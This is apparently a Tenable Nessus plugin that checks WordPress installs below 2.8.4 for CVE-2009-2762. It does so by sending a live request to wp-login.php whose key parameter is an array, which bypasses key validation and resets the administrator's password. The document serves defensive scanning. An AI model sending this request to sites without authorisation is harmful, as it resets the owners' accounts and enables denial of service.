#
# (C) Tenable Network Security, Inc.
#


include("compat.inc");


if (description)
{
  script_id(40577);
  script_version("$Revision: 1.3 $");

  script_cve_id("CVE-2009-2762");
  script_bugtraq_id(36014);
  script_xref(name:"milw0rm", value:"9410");
  script_xref(name:"OSVDB", value:"56971");
  script_xref(name:"Secunia", value:"36237");

  script_name(english:"WordPress < 2.8.4 Password Reset");
  script_summary(english:"Tries to do a password reset");

  script_set_attribute(
    attribute:"synopsis",
    value:string(
      "The remote web server contains a PHP application with a security\n",
      "bypass vulnerability."
    )
  );
  script_set_attribute(
    attribute:"description",
    value:string(
      "The version of WordPress running on the remote web server has a flaw\n",
      "in the password reset mechanism.  Validation of the secret user\n",
      "activation key can be bypassed by providing an array instead of a\n",
      "string.  This allows anyone to reset the password of the first user\n",
      "in the database, which is usually the administrator.  A remote\n",
      "attacker could use this to repeatedly reset the password, leading to\n",
      "a denial of service."
    )
  );
  script_set_attribute(
    attribute:"see_also",
    value:"http://archives.neohapsis.com/archives/fulldisclosure/2009-08/0114.html"
  );
  script_set_attribute(
    attribute:"see_also",
    value:"http://core.trac.wordpress.org/changeset/11798"
  );
  script_set_attribute(
    attribute:"see_also",
    value:"http://wordpress.org/development/2009/08/2-8-4-security-release/"
  );
  script_set_attribute(
    attribute:"solution",
    value:"Upgrade to WordPress 2.8.4 or later."
  );
  script_set_attribute(
    attribute:"cvss_vector",
    value:"CVSS2#AV:N/AC:L/Au:N/C:N/I:P/A:P"
  );
  script_set_attribute(
    attribute:"vuln_publication_date", 
    value:"2009/08/10"
  );
  script_set_attribute(
    attribute:"patch_publication_date", 
    value:"2009/08/12"
  );
  script_set_attribute(
    attribute:"plugin_publication_date", 
    value:"2009/08/12"
  );
  script_end_attributes();

  script_category(ACT_ATTACK);
  script_family(english:"CGI abuses");

  script_copyright(english:"This script is Copyright (C) 2009 Tenable Network Security, Inc.");

  script_dependencies("wordpress_detect.nasl");
  script_exclude_keys("Settings/disable_cgi_scanning");
  script_require_ports("Services/www", 80);

  exit(0);
}


include("global_settings.inc");
include("misc_func.inc");
include("http.inc");


if (safe_checks()) exit(1, "Safe checks must be disabled for this plugin.");

port = get_http_port(default:80);
if (!can_host_php(port:port)) exit(0, "Web server does not support PHP scripts.");

install = get_kb_item('www/' + port + '/wordpress');
if (isnull(install)) exit(1, "The 'www/"+port+"/wordpress' KB item is missing.");

match = eregmatch(string:install, pattern:'.+ under (/.*)$', icase:TRUE);
if (isnull(match)) exit(1, "Unable to read install info from KB.");

dir = match[1];
url = string(dir, '/wp-login.php?action=rp&key[]=');
res = http_send_recv3(method:"GET", item:url, port:port);
if (isnull(res)) exit(1, "The web server failed to respond.");

# If the system is vulnerable, it will redirect to:
#   wp-login.php?checkemail=newpass
# If it's patched, it will redirect to:
#   wp-login.php?action=lostpassword&error=invalidkey
if ('Location: wp-login.php?checkemail=newpass' >< res[1])
{
  if (report_verbosity > 0)
  {
    report = string(
      "\n",
      "Nessus requested the following URL :\n\n",
      "  ", build_url(qs:url, port:port), "\n\n",
      "which resulted in the password reset of a WordPress account on the\n",
      "remote host.  The affected user will likely receive an email\n",
      "informing them of this.\n"
    );
    security_warning(port:port, extra:report);
  }
  else security_warning(port);

  exit(0);
} 
else exit(0, "The remote WordPress install does not appear to be affected.");
